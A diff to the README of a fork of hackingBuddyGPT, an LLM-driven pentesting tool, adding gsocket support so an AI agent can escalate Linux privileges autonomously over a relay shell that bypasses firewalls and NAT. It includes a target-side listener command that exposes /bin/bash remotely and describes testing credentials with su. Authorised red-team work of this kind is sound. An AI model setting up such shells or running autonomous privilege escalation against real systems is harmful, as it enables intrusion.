@@ -375,3 +375,86 @@ By using hackingBuddyGPT, you agree to indemnify, defend, and hold harmless the 
 ### Disclaimer 2
 
 The use of hackingBuddyGPT for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state, and federal laws. The developers of hackingBuddyGPT assume no liability and are not responsible for any misuse or damage caused by this program. Only use it for educational purposes.
+
+---
+
+## Gsocket Connection Support (Fork Addition)
+
+This fork adds **gsocket (Global Socket)** support to hackingBuddyGPT, enabling AI-driven privilege escalation over gsocket connections - no SSH required.
+
+### What is gsocket?
+
+[gsocket](https://www.gsocket.io/) allows two machines to communicate through a relay network using a shared secret, bypassing firewalls and NAT without port forwarding. This is useful for red team operations where SSH access is not available but a reverse shell via gsocket is established on the target.
+
+### Setup
+
+```bash
+git clone https://github.com/44pie/hackingBuddyGPT.git
+cd hackingBuddyGPT
+pip install -e .
+```
+
+Make sure `gs-netcat` is installed on your system (see https://gsocket.io/deploy/).
+
+### Usage
+
+```bash
+wintermute LinuxPrivescUseCase \
+  --conn.type gsocket \
+  --conn.gsocket_secret "YOUR_GSOCKET_SECRET" \
+  --conn.hostname TARGET_HOSTNAME \
+  --conn.username TARGET_USERNAME \
+  --llm.api_key "YOUR_OPENAI_API_KEY" \
+  --llm.model gpt-4o
+```
+
+### Parameters
+
+| Parameter | Description |
+|-----------|-------------|
+| `--conn.type gsocket` | Use gsocket connection instead of SSH or local shell |
+| `--conn.gsocket_secret` | The shared gsocket secret for the connection |
+| `--conn.hostname` | Target hostname (for display/logging) |
+| `--conn.username` | Target username (for display/logging) |
+| `--llm.api_key` | OpenAI API key |
+| `--llm.model` | LLM model to use (e.g., gpt-4o, gpt-4-turbo) |
+
+### How It Works
+
+1. **GsocketConnection** spawns `gs-netcat` as a subprocess using the provided secret
+2. Commands are sent through stdin with unique markers for output parsing
+3. **GsocketRunCommand** executes commands and captures stdout with return codes
+4. **GsocketTestCredential** tests credentials via `su` over the gsocket shell
+5. The AI agent (LinuxPrivescUseCase) uses these capabilities to autonomously enumerate and escalate privileges
+
+### Architecture
+
+```
+hackingBuddyGPT/
+  src/hackingBuddyGPT/
+    utils/gsocket_connection/
+      __init__.py
+      gsocket_connection.py       # GsocketConnection class
+    capabilities/
+      gsocket_run_command.py      # Execute commands via gsocket
+      gsocket_test_credential.py  # Test credentials via gsocket
+    usecases/privesc/
+      linux.py                    # Modified to support GsocketConnection
+```
+
+### Prerequisites on Target
+
+The target machine must have a gsocket listener running:
+```bash
+gs-netcat -s "YOUR_GSOCKET_SECRET" -l -e /bin/bash
+```
+
+### Connection Types Comparison
+
+| Feature | SSH | Local Shell | Gsocket |
+|---------|-----|-------------|---------|
+| Requires open port | Yes (22) | No | No |
+| Bypasses firewall | No | N/A | Yes |
+| Requires credentials | Yes | No | Shared secret |
+| NAT traversal | No | N/A | Yes |
+| Use case | Standard pentest | Local testing | Red team / restricted access |
